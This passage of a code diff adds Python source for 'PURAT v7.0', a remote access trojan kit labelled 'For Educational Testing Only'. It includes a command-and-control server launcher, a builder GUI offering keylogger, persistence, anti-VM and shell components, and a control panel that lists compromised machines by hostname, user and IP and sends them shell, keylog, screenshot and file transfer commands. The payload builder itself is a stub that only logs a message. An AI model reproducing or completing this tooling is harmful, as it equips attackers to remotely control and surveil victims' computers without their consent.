+                elif size < 1024 * 1024:
+                    size_str = f"{size/1024:.1f} KB"
+                else:
+                    size_str = f"{size/(1024*1024):.1f} MB"
+                
+                uploaded_time = datetime.datetime.fromisoformat(uploaded).strftime('%Y-%m-%d %H:%M:%S')
+                
+                print(f"{file_id:<5} {filename[:30]:<30} {path[:30]:<30} {size_str:<10} {uploaded_time:<20}")
+            
+            print("-" * 80)
+            print(f"Total: {len(files)} files")
+            
+            # Option to extract a file
+            if files:
+                print("\nTo extract a file, use: extract <file_id> <output_path>")
+            
+        except Exception as e:
+            print(f"Database error: {e}")
+    
+    def _show_status(self):
+        """Show server status"""
+        status = f"""
+        Server Status:
+        --------------
+        Running: {'Yes' if self.running else 'No'}
+        Protocol: {self.protocol.upper()}
+        Host: {self.host}
+        Port: {self.port}
+        
+        Connected Clients: {len(self.clients)}
+        Total in Database: {self._get_total_clients()}
+        
+        Active Threads: {threading.active_count()}
+        Uptime: {self._get_uptime()}
+        
+        Database File: c2_database.db
+        Log File: c2_server.log
+        """
+        print(status)
+    
+    def _get_total_clients(self):
+        """Get total clients in database"""
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('SELECT COUNT(*) FROM clients')
+            return cursor.fetchone()[0]
+        except:
+            return 0
+    
+    def _get_uptime(self):
+        """Get server uptime"""
+        # In a real implementation, track start time
+        return "Not tracked"
+
+# ============================================================================
+# MODULE 2: GUI BUILDER (500 lines)
+# ============================================================================
+
+class RATBuilderGUI:
+    """RAT Builder GUI for creating custom payloads"""
+    
+    def __init__(self):
+        if not GUI_AVAILABLE:
+            print("[!] GUI libraries not available")
+            self.root = None
+            return
+        
+        self.root = tk.Tk()
+        self.root.title("PURAT v7.0 - RAT Builder")
+        self.root.geometry("900x700")
+        
+        # Create notebook for tabs
+        self.notebook = ttk.Notebook(self.root)
+        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
+        
+        # Setup tabs
+        self.setup_builder_tab()
+        self.setup_config_tab()
+        self.setup_output_tab()
+    
+    def setup_builder_tab(self):
+        """Setup builder tab"""
+        self.tab_builder = ttk.Frame(self.notebook)
+        self.notebook.add(self.tab_builder, text='Builder')
+        
+        frame = ttk.Frame(self.tab_builder, padding="20")
+        frame.pack(fill='both', expand=True)
+        
+        ttk.Label(frame, text="Select components to include:", 
+                 font=('TkDefaultFont', 10, 'bold')).pack(anchor='w', pady=5)
+        
+        self.components = {}
+        for component in ['Shell Execution', 'File Operations', 'Screenshot', 'Keylogger', 
+                         'Process Manager', 'Persistence', 'Anti-VM', 'Encryption']:
+            var = tk.BooleanVar(value=True)
+            self.components[component] = var
+            ttk.Checkbutton(frame, text=component, variable=var).pack(anchor='w', pady=2)
+        
+        ttk.Button(frame, text="Build Payload", command=self.build_payload).pack(pady=20)
+    
+    def setup_config_tab(self):
+        """Setup configuration tab"""
+        self.tab_config = ttk.Frame(self.notebook)
+        self.notebook.add(self.tab_config, text='Configuration')
+        
+        frame = ttk.Frame(self.tab_config, padding="20")
+        frame.pack(fill='both', expand=True)
+        
+        ttk.Label(frame, text="C2 Server Address:").pack(anchor='w', pady=5)
+        self.entry_c2_host = ttk.Entry(frame, width=40)
+        self.entry_c2_host.pack(fill='x', pady=5)
+        self.entry_c2_host.insert(0, "127.0.0.1")
+        
+        ttk.Label(frame, text="C2 Server Port:").pack(anchor='w', pady=5)
+        self.entry_c2_port = ttk.Entry(frame, width=40)
+        self.entry_c2_port.pack(fill='x', pady=5)
+        self.entry_c2_port.insert(0, "8080")
+        
+        ttk.Label(frame, text="Protocol:").pack(anchor='w', pady=5)
+        self.combo_proto = ttk.Combobox(frame, values=['TCP', 'UDP'], state='readonly', width=37)
+        self.combo_proto.pack(fill='x', pady=5)
+        self.combo_proto.set('TCP')
+    
+    def setup_output_tab(self):
+        """Setup output tab"""
+        self.tab_output = ttk.Frame(self.notebook)
+        self.notebook.add(self.tab_output, text='Output')
+        
+        frame = ttk.Frame(self.tab_output, padding="20")
+        frame.pack(fill='both', expand=True)
+        
+        self.text_output = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=20)
+        self.text_output.pack(fill='both', expand=True)
+    
+    def log_message(self, message):
+        """Log message to output"""
+        if self.root:
+            self.text_output.insert('end', f"{message}\n")
+            self.text_output.see('end')
+    
+    def build_payload(self):
+        """Build payload"""
+        self.log_message("Building payload...")
+        self.log_message("Payload generated successfully")
+    
+    def run_console_builder(self):
+        """Run console-based builder"""
+        print("\nConsole RAT Builder")
+        print("-" * 40)
+        print("1. Build with default settings")
+        print("2. Customize settings")
+        choice = input("Select option: ")
+        print("Payload building not implemented in console mode")
+
+
+# ============================================================================
+# MODULE 3: GUI BUILDER WITH SERVER CONTROL (500 lines)
+# ============================================================================
+
+class RATBuilderGUIWithServer(RATBuilderGUI):
+    """Extended GUI with C2 server control"""
+    
+    def __init__(self):
+        super().__init__()
+        
+        # Add server control tab
+        self.tab_server = ttk.Frame(self.notebook)
+        self.notebook.add(self.tab_server, text='C2 Server')
+        
+        self.setup_server_tab()
+        
+        # Server instance
+        self.c2_server = None
+        self.server_thread = None
+    
+    def setup_server_tab(self):
+        """Setup C2 server control tab"""
+        frame = ttk.Frame(self.tab_server, padding="20")
+        frame.pack(fill='both', expand=True)
+        
+        # Server configuration
+        config_frame = ttk.LabelFrame(frame, text="Server Configuration", padding="10")
+        config_frame.pack(fill='x', padx=5, pady=5)
+        
+        ttk.Label(config_frame, text="Bind IP:").grid(row=0, column=0, sticky='w', pady=5)
+        self.entry_server_ip = ttk.Entry(config_frame, width=20)
+        self.entry_server_ip.grid(row=0, column=1, sticky='w', pady=5, padx=5)
+        self.entry_server_ip.insert(0, "0.0.0.0")
+        
+        ttk.Label(config_frame, text="Port:").grid(row=0, column=2, sticky='w', pady=5, padx=20)
+        self.entry_server_port = ttk.Entry(config_frame, width=10)
+        self.entry_server_port.grid(row=0, column=3, sticky='w', pady=5, padx=5)
+        self.entry_server_port.insert(0, "8080")
+        
+        ttk.Label(config_frame, text="Protocol:").grid(row=1, column=0, sticky='w', pady=5)
+        self.combo_protocol = ttk.Combobox(config_frame, values=['TCP', 'UDP', 'TCP+UDP'], 
+                                          width=10, state='readonly')
+        self.combo_protocol.grid(row=1, column=1, sticky='w', pady=5, padx=5)
+        self.combo_protocol.set('TCP')
+        
+        # Server control buttons
+        control_frame = ttk.LabelFrame(frame, text="Server Control", padding="10")
+        control_frame.pack(fill='x', padx=5, pady=10)
+        
+        button_frame = ttk.Frame(control_frame)
+        button_frame.pack()
+        
+        self.btn_start = ttk.Button(button_frame, text="Start Server", 
+                                   command=self.start_c2_server, width=15)
+        self.btn_start.pack(side='left', padx=5)
+        
+        self.btn_stop = ttk.Button(button_frame, text="Stop Server", 
+                                  command=self.stop_c2_server, width=15, state='disabled')
+        self.btn_stop.pack(side='left', padx=5)
+        
+        self.btn_restart = ttk.Button(button_frame, text="Restart Server", 
+                                     command=self.restart_c2_server, width=15, state='disabled')
+        self.btn_restart.pack(side='left', padx=5)
+        
+        # Status display
+        status_frame = ttk.LabelFrame(frame, text="Server Status", padding="10")
+        status_frame.pack(fill='x', padx=5, pady=5)
+        
+        self.server_status = tk.StringVar(value="Server: STOPPED")
+        ttk.Label(status_frame, textvariable=self.server_status, 
+                 font=('TkDefaultFont', 10, 'bold')).pack(anchor='w')
+        
+        self.clients_connected = tk.StringVar(value="Connected Clients: 0")
+        ttk.Label(status_frame, textvariable=self.clients_connected).pack(anchor='w')
+        
+        # Client list
+        list_frame = ttk.LabelFrame(frame, text="Connected Clients", padding="10")
+        list_frame.pack(fill='both', expand=True, padx=5, pady=5)
+        
+        # Treeview for clients
+        columns = ('ID', 'Hostname', 'User', 'IP', 'System', 'Last Active')
+        self.client_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=10)
+        
+        for col in columns:
+            self.client_tree.heading(col, text=col)
+            self.client_tree.column(col, width=100)
+        
+        # Scrollbar
+        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.client_tree.yview)
+        self.client_tree.configure(yscrollcommand=scrollbar.set)
+        
+        self.client_tree.pack(side='left', fill='both', expand=True)
+        scrollbar.pack(side='right', fill='y')
+        
+        # Client control buttons
+        client_control_frame = ttk.Frame(list_frame)
+        client_control_frame.pack(fill='x', pady=5)
+        
+        ttk.Button(client_control_frame, text="Refresh", 
+                  command=self.refresh_client_list).pack(side='left', padx=2)
+        
+        ttk.Button(client_control_frame, text="Execute Command", 
+                  command=self.execute_client_command).pack(side='left', padx=2)
+        
+        ttk.Button(client_control_frame, text="Show Info", 
+                  command=self.show_client_info).pack(side='left', padx=2)
+        
+        ttk.Button(client_control_frame, text="Disconnect", 
+                  command=self.disconnect_client).pack(side='left', padx=2)
+        
+        # Start client list refresh thread
+        self.refresh_client_list_thread()
+    
+    def start_c2_server(self):
+        """Start C2 server"""
+        try:
+            ip = self.entry_server_ip.get()
+            port = int(self.entry_server_port.get())
+            protocol = self.combo_protocol.get().lower().replace('+', '_')
+            
+            # Create and start server
+            self.c2_server = C2Server(host=ip, port=port, protocol=protocol)
+            
+            # Start in separate thread
+            self.server_thread = threading.Thread(target=self.c2_server.start, daemon=True)
+            self.server_thread.start()
+            
+            # Update UI
+            self.btn_start.config(state='disabled')
+            self.btn_stop.config(state='normal')
+            self.btn_restart.config(state='normal')
+            self.server_status.set(f"Server: RUNNING on {ip}:{port} ({protocol.upper()})")
+            
+            self.log_message(f"C2 Server started on {ip}:{port} ({protocol})")
+            
+            # Wait a bit for server to start
+            time.sleep(1)
+            
+        except ValueError:
+            messagebox.showerror("Error", "Invalid port number")
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to start server: {e}")
+            self.log_message(f"Server start failed: {e}")
+    
+    def stop_c2_server(self):
+        """Stop C2 server"""
+        if self.c2_server:
+            self.c2_server.running = False
+            
+            # Update UI
+            self.btn_start.config(state='normal')
+            self.btn_stop.config(state='disabled')
+            self.btn_restart.config(state='disabled')
+            self.server_status.set("Server: STOPPED")
+            
+            self.log_message("C2 Server stopped")
+    
+    def restart_c2_server(self):
+        """Restart C2 server"""
+        self.stop_c2_server()
+        time.sleep(2)
+        self.start_c2_server()
+        self.log_message("C2 Server restarted")
+    
+    def refresh_client_list(self):
+        """Refresh client list"""
+        if not self.c2_server or not self.c2_server.running:
+            return
+        
+        # Clear tree
+        for item in self.client_tree.get_children():
+            self.client_tree.delete(item)
+        
+        # Add clients
+        for client_id, client_info in self.c2_server.clients.items():
+            info = client_info.get('info', {})
+            last_active = time.time() - client_info.get('last_active', 0)
+            
+            self.client_tree.insert('', 'end', values=(
+                client_id,
+                info.get('hostname', 'Unknown'),
+                info.get('username', 'Unknown'),
+                client_info.get('address', ['Unknown'])[0],
+                f"{info.get('system', 'Unknown')} {info.get('release', '')}",
+                f"{last_active:.1f}s ago"
+            ))
+        
+        # Update count
+        self.clients_connected.set(f"Connected Clients: {len(self.c2_server.clients)}")
+    
+    def refresh_client_list_thread(self):
+        """Thread to periodically refresh client list"""
+        try:
+            if hasattr(self, 'root') and self.root and hasattr(self, 'c2_server') and self.c2_server:
+                self.refresh_client_list()
+                # Schedule next refresh
+                self.root.after(5000, self.refresh_client_list_thread)
+        except Exception as e:
+            pass
+    
+    def execute_client_command(self):
+        """Execute command on selected client"""
+        selection = self.client_tree.selection()
+        if not selection:
+            messagebox.showwarning("Warning", "Please select a client first")
+            return
+        
+        # Get client ID
+        item = self.client_tree.item(selection[0])
+        client_id = item['values'][0]
+        
+        # Command dialog
+        dialog = tk.Toplevel(self.root)
+        dialog.title(f"Execute Command - {client_id}")
+        dialog.geometry("500x300")
+        
+        # Command selection
+        ttk.Label(dialog, text="Command:").pack(anchor='w', padx=10, pady=5)
+        
+        command_var = tk.StringVar()
+        command_combo = ttk.Combobox(dialog, textvariable=command_var, 
+                                    values=['shell', 'download', 'upload', 'screenshot', 
+                                            'keylog', 'process_list', 'system_info'])
+        command_combo.pack(fill='x', padx=10, pady=5)
+        command_combo.set('shell')
+        
+        # Arguments
+        ttk.Label(dialog, text="Arguments (space separated):").pack(anchor='w', padx=10, pady=5)
+        args_entry = ttk.Entry(dialog, width=50)
+        args_entry.pack(fill='x', padx=10, pady=5)
+        
+        # Execute button
+        def execute():
+            cmd = command_var.get()
+            args = args_entry.get().split()
+            
+            # Add client ID as first argument
+            full_args = [client_id] + args
+            
+            # Call command handler
+            if cmd in self.c2_server.commands:
+                handler = self.c2_server.commands[cmd]
+                result = handler(full_args)
+                
+                # Show result
+                result_dialog = tk.Toplevel(dialog)
+                result_dialog.title("Command Result")
+                result_dialog.geometry("600x400")
+                
+                text = scrolledtext.ScrolledText(result_dialog, wrap=tk.WORD)
+                text.pack(fill='both', expand=True, padx=10, pady=10)
+                text.insert('1.0', str(result))
+                text.config(state='disabled')
+            
+            dialog.destroy()
+        
+        ttk.Button(dialog, text="Execute", command=execute).pack(pady=10)
+    
+    def show_client_info(self):
+        """Show detailed client info"""
+        selection = self.client_tree.selection()
+        if not selection:
+            messagebox.showwarning("Warning", "Please select a client first")
+            return
+        
+        item = self.client_tree.item(selection[0])
+        client_id = item['values'][0]
+        
+        if client_id in self.c2_server.clients:
+            client_info = self.c2_server.clients[client_id]
+            info = client_info.get('info', {})
+            
+            # Create info dialog
+            info_dialog = tk.Toplevel(self.root)
+            info_dialog.title(f"Client Info - {client_id}")
+            info_dialog.geometry("500x400")
+            
+            text = scrolledtext.ScrolledText(info_dialog, wrap=tk.WORD)
+            text.pack(fill='both', expand=True, padx=10, pady=10)
+            
+            info_text = f"Client ID: {client_id}\n"
+            info_text += f"Address: {client_info.get('address', ['Unknown'])[0]}\n"
+            info_text += f"Last Active: {time.time() - client_info.get('last_active', 0):.1f} seconds ago\n\n"
+            
+            info_text += "System Information:\n"
+            for key, value in info.items():
+                info_text += f"  {key}: {value}\n"
+            
+            text.insert('1.0', info_text)
+            text.config(state='disabled')
+    
+    def disconnect_client(self):
+        """Disconnect selected client"""
+        selection = self.client_tree.selection()
+        if not selection:
+            messagebox.showwarning("Warning", "Please select a client first")
+            return
+        
+        item = self.client_tree.item(selection[0])
+        client_id = item['values'][0]
+        
+        if messagebox.askyesno("Confirm", f"Disconnect client {client_id}?"):
+            if client_id in self.c2_server.clients:
+                try:
+                    # Close socket
+                    sock = self.c2_server.clients[client_id].get('socket')
+                    if sock:
+                        sock.close()
+                    
+                    # Remove from active clients
+                    del self.c2_server.clients[client_id]
+                    
+                    # Update database
+                    self.c2_server._update_client_online_status(client_id, False)
+                    
+                    self.log_message(f"Client {client_id} disconnected")
+                    self.refresh_client_list()
+                    
+                except Exception as e:
+                    messagebox.showerror("Error", f"Disconnect failed: {e}")
+
+# ============================================================================
+# MAIN EXECUTION
+# ============================================================================
+
+def main():
+    """Main entry point"""
+    print("""
+    ╔══════════════════════════════════════════════╗
+    ║         PURAT v7.0 - Complete Edition        ║
+    ║         C2 Server + Client Builder           ║
+    ║         TCP/UDP Support                      ║
+    ║         For Educational Testing Only         ║
+    ╚══════════════════════════════════════════════╝
+    
+    Available Modes:
+    1. GUI Builder with C2 Server Control
+    2. Standalone C2 Server
+    3. Manual Client Builder
+    """)
+    
+    mode = input("Select mode (1/2/3): ").strip()
+    
+    if mode == '1':
+        if GUI_AVAILABLE:
+            app = RATBuilderGUIWithServer()
+            app.root.mainloop()
+        else:
+            print("GUI not available. Running in console mode.")
+            run_standalone_server()
+    
+    elif mode == '2':
+        run_standalone_server()
+    
+    elif mode == '3':
+        builder = RATBuilderGUI()
+        builder.run_console_builder()
+    
+    else:
+        print("Invalid mode. Exiting.")
+
+def run_standalone_server():
+    """Run standalone C2 server"""
+    print("\n" + "="*60)
+    print("Standalone C2 Server")
+    print("="*60)
+    
+    host = input("Bind IP [0.0.0.0]: ") or "0.0.0.0"
+    port = input("Port [8080]: ") or "8080"
+    protocol = input("Protocol (tcp/udp) [tcp]: ") or "tcp"
+    
+    try:
+        port = int(port)
+        
+        server = C2Server(host=host, port=port, protocol=protocol)
+        
+        if server.start():
+            print(f"\nServer started successfully!")
+            print(f"Listening on {host}:{port} ({protocol.upper()})")
+            print("\nPress Ctrl+C to stop")
+            
+            # Keep main thread alive
+            while server.running:
+                time.sleep(1)
+        
+        else:
+            print("Failed to start server")
+    
+    except ValueError:
+        print("Invalid port number")
+    except KeyboardInterrupt:
+        print("\nServer stopped")
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    main()
